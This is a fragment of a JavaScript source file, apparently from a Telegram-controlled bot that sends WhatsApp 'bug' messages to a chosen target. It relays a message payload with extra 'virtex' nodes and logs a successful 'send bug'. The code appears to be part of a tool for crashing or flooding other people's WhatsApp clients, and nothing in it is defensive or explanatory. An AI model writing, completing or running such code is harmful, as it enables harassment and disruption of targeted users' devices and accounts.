  await angeles.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
console.log(chalk.red.bold(`Succes send bug to ${target}`))
}

// --- Jalankan Bot ---
bot.launch();
console.log("Telegram bot is running...");